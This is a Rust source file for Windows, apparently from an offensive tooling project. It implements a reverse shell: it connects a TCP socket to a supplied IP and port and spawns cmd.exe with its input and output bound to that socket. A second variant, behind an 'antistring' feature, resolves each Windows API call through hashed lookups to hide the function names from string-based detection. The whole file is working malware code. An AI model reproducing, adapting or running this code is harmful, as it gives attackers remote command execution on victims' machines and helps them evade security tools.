use std::{mem, ptr};
use std::ffi::{CStr, CString, c_void};
use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Networking::WinSock::{AF_INET, IPPROTO_TCP, SOCK_STREAM, SOCKADDR, SOCKADDR_IN, SOCKET, WSAData};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::Threading::{PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA};
#[cfg(not(feature = "antistring"))]
use windows::Win32::Networking::WinSock::{connect, htons, inet_pton, WSASocketA, WSAStartup};
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::SystemInformation::GetSystemDirectoryA;
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::Threading::CreateProcessA;
#[cfg(feature = "antistring")]
use windows::Win32::Foundation::BOOL;
#[cfg(feature = "antistring")]
use windows::Win32::Networking::WinSock::WSAPROTOCOL_INFOA;

// https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms632663(v=vs.85)
// Normally this is called by MAKEWORD(2,2), which is 514
const WSASTARTUPVAL: u16 = 514;

#[cfg(not(feature = "antistring"))]
pub fn shell(ip: &str, port: u16) {
    // Call WSAStartup so that you can do anything with sockets
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSAStartup.html
    let wsa_start_result = unsafe {
        WSAStartup(
            WSASTARTUPVAL,
            &mut WSAData::default()
        )
    };
    if wsa_start_result != 0 {
        panic!("Unable to call WSAStartup")
    }

    // Call WSASocket to create a socket
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSASocketA.html
    let socket = unsafe {
        WSASocketA(
            AF_INET.0 as i32,
            SOCK_STREAM as i32,
            IPPROTO_TCP.0,
            ptr::null(), 
            0,
            0
        )
    };

    // Call inet_pton to populate the sockaddr_in.sin_addr field, which is needed as part of the socket connection
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.inet_pton.html
    let mut sockaddr_in = SOCKADDR_IN {
        sin_family: AF_INET.0 as u16,
         ..Default::default()
    };
    // This is magic that I don't really understand but seems to work
    let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
    // Create a PCSTR and use the IP string as the 0 field
    let ip_pcstr = PCSTR(CString::new(ip)
        .unwrap()
        .into_raw() as *mut u8
    );
    // Calling pton with the pointer sin_addr_ptr --> sockaddr_in.sin_addr should mean sockaddr_in.sin_addr has the IP struct now
    let conversion_result = unsafe {
        inet_pton(
            AF_INET.0 as i32,
            ip_pcstr,
            sin_addr_ptr
        )
    };
    if conversion_result != 1 {
        panic!("Unable to convert IP address to usable form with inet_pton")
    }

    // Call htons to convert the port from a u16 to the TCP/IP network order
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.htons.html
    sockaddr_in.sin_port = unsafe { 
        htons(
            port
        )
    };

    // Connect the socket!
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.connect.html
    let connection_result = unsafe { 
        connect(
            socket,
            &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR,
            mem::size_of::<SOCKADDR_IN>() as _
        )
    };
    if connection_result != 0 {
        panic!("Unable to call connect to the remote socket")
    }

    // Call GetSystemDirectoryA to figure out where cmd.exe will be
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/SystemInformation/fn.GetSystemDirectoryA.html
    let lp_buffer: &mut [u8] = &mut [0; 50];
    unsafe {
        GetSystemDirectoryA(
            lp_buffer
        )
    };
    let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
    let system_dir = system_dir.to_str().unwrap();

    // Call CreateProcessA to spawn a shell with stdin/stdout/stderr as the socket
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
    // dwFlags --> STARTF_USESTDHANDLES (0x00000100) means that stdin/stdout/stderr contain information that needs to be parsed
    let mut startup_info = STARTUPINFOA {
        cb: mem::size_of::<STARTUPINFOA>() as u32,
        dwFlags: STARTF_USESTDHANDLES,
        ..Default::default()
    };
    let sock_handle = &socket as *const SOCKET as *const HANDLE;
    startup_info.hStdInput = unsafe { *sock_handle };
    startup_info.hStdOutput = unsafe { *sock_handle };
    startup_info.hStdError = unsafe { *sock_handle };
    let lp_command_line = PSTR(CString::new(format!("{system_dir}\\cmd.exe"))
        .unwrap()
        .into_raw() as *mut u8
    );
    let create_res = unsafe {
        CreateProcessA(
            PCSTR::null(),
            lp_command_line,
            &SECURITY_ATTRIBUTES::default(),
            &SECURITY_ATTRIBUTES::default(),
            true,
            PROCESS_CREATION_FLAGS::default(),
            ptr::null(),
            PCSTR::null(),
            &startup_info,
            &mut PROCESS_INFORMATION::default()
        )
    };
    if !create_res.as_bool() {
        panic!("Could not start cmd.exe process");
    }
}

#[cfg(feature = "antistring")]
pub fn antistring_shell(ip: &str, port: u16) {
    // See line 16
    let function = rco_utils::find_function_address("Ws2_32", 0xedf45b56dba24418).unwrap();
    let function = rco_utils::test!(function; [u16, WSAData]; [()]);
    function(WSASTARTUPVAL, &mut WSAData::default());
    /*unsafe { 
        mem::transmute::<*const (), fn(u16, WSAData)>
        (function)(WSASTARTUPVAL, &mut WSAData::default())
    };*/

    // See line 25
    let function = rco_utils::find_function_address("Ws2_32", 0xad51563d572a6798).unwrap();
    let socket = unsafe { 
        mem::transmute::<*const (), fn(i32, i32, i32, *const WSAPROTOCOL_INFOA, i32, i32) -> SOCKET>
        (function)(AF_INET.0 as i32, SOCK_STREAM as i32, IPPROTO_TCP.0, ptr::null(), 0, 0)
    };

    // See line 30
    let function = rco_utils::find_function_address("Ws2_32", 0xf6d69fad519d46a0).unwrap();
    let mut sockaddr_in = SOCKADDR_IN::default();
    sockaddr_in.sin_family = AF_INET.0 as u16;
    let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
    let ip_pcstr = PCSTR(CString::new(ip)
        .unwrap()
        .into_raw() as *mut u8
    );
    unsafe { 
        mem::transmute::<*const (), fn(i32, PCSTR, *mut c_void) -> i32>
        (function)(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr)
    };

    // See line 46
    let function = rco_utils::find_function_address("Ws2_32", 0x57420f0d05112fd1).unwrap();
    sockaddr_in.sin_port = unsafe { 
        mem::transmute::<*const (), fn(u16) -> u16>
        (function)(port)
    };

    // See line 51
    let function = rco_utils::find_function_address("Ws2_32", 0xcbfa974b4e43f414).unwrap();
    unsafe { 
        mem::transmute::<*const (), fn(SOCKET, *const SOCKADDR, i32) -> i32>
        (function)(socket, &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR, mem::size_of::<SOCKADDR_IN>() as _)
    };

    // See line 59
    let function = rco_utils::find_function_address("Kernel32", 0x9822936f60f9a914).unwrap();
    let lp_buffer: &mut [u8] = &mut [0; 50];
    unsafe { 
        mem::transmute::<*const (), fn(&mut [u8])>
        (function)(lp_buffer)
    };
    let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
    let system_dir = system_dir.to_str().unwrap();

    // See line 67
    let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
    let mut startup_info = STARTUPINFOA {
        cb: mem::size_of::<STARTUPINFOA>() as u32,
        dwFlags: STARTF_USESTDHANDLES,
        ..Default::default()
    };
    let sock_handle = &socket as *const SOCKET as *const HANDLE;
    startup_info.hStdInput = unsafe { *sock_handle };
    startup_info.hStdOutput = unsafe { *sock_handle };
    startup_info.hStdError = unsafe { *sock_handle };
    let lp_command_line = PSTR(CString::new(format!("{system_dir}\\cmd.exe"))
        .unwrap()
        .into_raw() as *mut u8
    );
    unsafe {
        mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
        (function)(PCSTR::null(),
                   lp_command_line,
                   &SECURITY_ATTRIBUTES::default(),
                   &SECURITY_ATTRIBUTES::default(),
                   true,
                   PROCESS_CREATION_FLAGS::default(),
                   ptr::null(),
                   PCSTR::null(),
                   &startup_info,
                   &mut PROCESS_INFORMATION::default())
    };
}
